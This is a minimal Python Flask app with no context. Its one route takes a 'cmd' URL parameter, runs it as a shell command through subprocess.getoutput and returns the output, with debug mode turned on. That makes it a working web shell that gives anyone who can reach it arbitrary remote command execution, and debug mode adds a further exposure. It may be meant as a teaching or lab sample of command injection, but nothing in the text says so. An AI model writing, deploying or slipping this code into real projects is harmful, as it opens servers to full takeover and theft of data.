from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route("/")
def run_cmd():
    cmd = request.args.get("cmd")
    if cmd:
        output = subprocess.getoutput(cmd)
        return f"<pre>{output}</pre>"
    return "No command provided."

if __name__ == "__main__":
    app.run(debug=True)
